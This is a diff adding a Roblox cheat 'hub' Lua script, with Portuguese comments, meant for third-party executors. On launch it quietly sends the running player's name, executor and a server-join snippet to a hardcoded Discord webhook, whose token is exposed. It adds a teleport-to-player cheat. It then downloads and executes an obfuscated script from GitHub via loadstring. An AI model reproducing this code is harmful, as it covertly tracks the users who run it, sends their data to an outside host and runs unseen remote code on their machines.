@@ -1,0 +1,79 @@
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1559060416917934162/IVnClFr4LiCWu9o2bd5hGwLXaARviy9jkV61v8zl3kwdUAVJHR2-j1VbaDiXjkjDvXdV"
+
+-- Serviços do Roblox
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local LocalPlayer = Players.LocalPlayer
+
+-- ==========================================
+-- 1. SISTEMA DE LOGS (NOME, EXECUTOR E JOB ID)
+-- ==========================================
+local requestFunction = (syn and syn.request) or (http and http.request) or http_request or request
+
+if requestFunction then
+    pcall(function()
+        local executorName = identifyexecutor and identifyexecutor() or "Desconhecido"
+        local jobId = game.JobId
+
+        local payload = {
+            username = "XTN HUB",
+            content = "@everyone @here",
+            embeds = {
+                {
+                    title = "🚨 HUB Executado!",
+                    color = 3447003,
+                    fields = {
+                        {
+                            name = "👤 Nome",
+                            value = LocalPlayer.Name,
+                            inline = true
+                        },
+                        {
+                            name = "⚙️ Executor",
+                            value = executorName,
+                            inline = true
+                        },
+                        {
+                            name = "🔑 Job ID (Código do Servidor)",
+                            value = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. jobId .. "', game.Players.LocalPlayer)\n```",
+                            inline = false
+                        }
+                    }
+                }
+            }
+        }
+
+        requestFunction({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+-- ==========================================
+-- 2. FUNÇÃO DE TELEPORTE (TP) ATÉ À PESSOA NO JOGO
+-- ==========================================
+_G.TeleportToPlayer = function(TargetUsername)
+    for _, targetPlayer in pairs(Players:GetPlayers()) do
+        if targetPlayer ~= LocalPlayer and (targetPlayer.Name:lower():find(TargetUsername:lower()) or targetPlayer.DisplayName:lower():find(TargetUsername:lower())) then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
+                    print("Teleportado para: " .. targetPlayer.Name)
+                    return
+                end
+            end
+        end
+    end
+    warn("Jogador não encontrado!")
+end
+
+-- ==========================================
+-- 3. CARREGA O SEU HUB OBFUSCADO
+-- ==========================================
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vzx7376/Obfuscate.-K/refs/heads/main/obfuscated_script-1791852536766.lua.txt"))()
